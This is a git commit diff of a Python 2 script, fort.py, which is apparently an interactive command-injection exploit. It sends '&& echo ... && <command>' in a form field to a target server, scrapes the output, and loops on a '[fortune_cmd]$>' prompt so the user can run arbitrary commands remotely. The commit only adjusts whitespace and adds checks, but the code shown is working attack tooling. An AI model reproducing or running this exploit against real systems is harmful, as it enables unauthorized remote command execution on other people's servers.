6af52cabf798d195fd41130d71483726f46fd96d
Seyptoo <39600961+Seyptoo@users.noreply.github.com>
2019-03-15 12:31:29 +0100

    Update fort.py

--- fort.py
+++ fort.py
@@ -23,21 +23,22 @@ class dns_requests:
 		'''
 			The code that will be executed
 			on the remote server.
-		'''
+		'''	
 		self.post_data = "&& echo '/InvokeRequests' && %s" %(ExecutionCommand)
 		self.post_data = {"db":self.post_data}
 
 		InvokeRequests = requests.post(self.target_ip, data=self.post_data).text
 		InvokeRequests = BeautifulSoup(InvokeRequests, "html5lib")
-		
+
 		InvokesSearchs = InvokeRequests.find_all('pre')[0]
 		InvokesSearchs = "".join(InvokesSearchs).split()[::-1]	
 
 		RegexValueReqs = InvokesSearchs.index('/InvokeRequests')
 		CountInvokeReq = len(InvokesSearchs)
 
-		del InvokesSearchs[RegexValueReqs:CountInvokeReq]
-		print " ".join(InvokesSearchs)		
+		if isinstance(RegexValueReqs, int) == True and isinstance(CountInvokeReq, int) == True:
+			del InvokesSearchs[RegexValueReqs:CountInvokeReq]
+			print " ".join(InvokesSearchs)
 
 	def __str__(self):
 		'''
@@ -46,10 +47,9 @@ class dns_requests:
 		'''
 		while True:
 			ExecutionCommand = raw_input('\033[42m[fortune_cmd]$> \033[0m ')
-			if ExecutionCommand == ""     : print None 
+			if ExecutionCommand == ""     : continue 
 			if ExecutionCommand == "quit" : sys.exit(0)
-
-			self.values_in_col(ExecutionCommand)
+			if ExecutionCommand != ""     : self.values_in_col(ExecutionCommand)
 	
 			# So I create a loop to have information about the command.
 			#Additional information on the execution of the code.
